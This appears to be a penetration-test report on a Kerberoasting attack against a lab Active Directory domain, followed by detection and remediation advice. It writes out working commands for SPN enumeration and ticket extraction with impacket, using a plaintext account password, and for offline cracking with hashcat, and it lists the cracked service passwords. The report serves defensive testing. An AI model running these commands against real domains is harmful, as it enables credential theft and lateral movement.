# Kerberoasting Attack Report

**Target Domain:** corp.local  
**Domain Controller:** 192.168.56.102  
**Date:** May 15, 2026  
**Tester:** Tyler Thomas  
**Technique:** Kerberoasting  
**MITRE ATT&CK:** T1558.003  

## Overview
Kerberoasting is an Active Directory attack technique that exploits the Kerberos authentication protocol. Any authenticated domain user can request service tickets for accounts with registered Service Principal Names (SPNs). These tickets are encrypted with the service account's password hash and can be taken offline for cracking without triggering account lockouts or generating significant alerts.

## Why This Matters In Real Engagements
This attack requires only one valid low-privilege domain account to execute. No special permissions, no noisy exploitation, no vulnerability patching required. It abuses legitimate Kerberos functionality making it difficult to detect and widely used in real penetration tests and by threat actors.

## Attack Methodology

### Step 1 — Domain Enumeration
Identified domain controller and confirmed domain name:
crackmapexec smb 192.168.56.102
Result: Windows Server 2019, domain: corp.local, signing: True

### Step 2 — SPN Enumeration and Hash Extraction
Using compromised low-privilege account (jsmith) requested all Kerberos service tickets:
impacket-GetUserSPNs corp.local/jsmith:Password123! -dc-ip 192.168.56.102 -request

Kerberoastable accounts identified:

| Account | SPN | Password Last Set |
|---|---|---|
| svc_sql | MSSQLSvc/dc01.corp.local:1433 | 2026-05-15 |
| svc_web | HTTP/web.corp.local | 2026-05-15 |

### Step 3 — Offline Password Cracking
Extracted TGS hashes cracked offline using Hashcat with rockyou wordlist and best66 rules:
hashcat -m 13100 kerberoast-hashes.txt rockyou.txt -r best66.rule

### Step 4 — Results

| Account | Hash Cracked | Password |
|---|---|---|
| svc_web | Yes | Password1! |
| svc_sql | No | Resistant to dictionary attack |

## Impact Assessment
**Severity: Critical**

Compromise of svc_web provides:
- Authenticated access to all web services running under this account
- Potential lateral movement to other systems
- Possible privilege escalation if service account has elevated permissions
- Persistent access without triggering account lockout

## Detection Opportunities
- Monitor for unusual Kerberos TGS requests — particularly bulk requests
- Alert on RC4 encryption type (etype 23) in TGS requests as modern environments should use AES
- Windows Event ID 4769 logs Kerberos service ticket requests

## Remediation Recommendations
1. Immediately reset svc_web password to a random 25+ character string
2. Audit all accounts with SPNs — remove unnecessary SPNs
3. Implement Group Managed Service Accounts (gMSA) which automatically rotate passwords making Kerberoasting infeasible
4. Enable AES encryption for Kerberos — eliminates RC4 downgrade attacks
5. Monitor Event ID 4769 for anomalous TGS request volume
6. Apply principle of least privilege to all service accounts

## Tools Used
- CrackMapExec — Domain enumeration
- Impacket GetUserSPNs — SPN enumeration and hash extraction
- Hashcat — Offline password cracking
- Rockyou wordlist + best66 rules — Password attack methodology
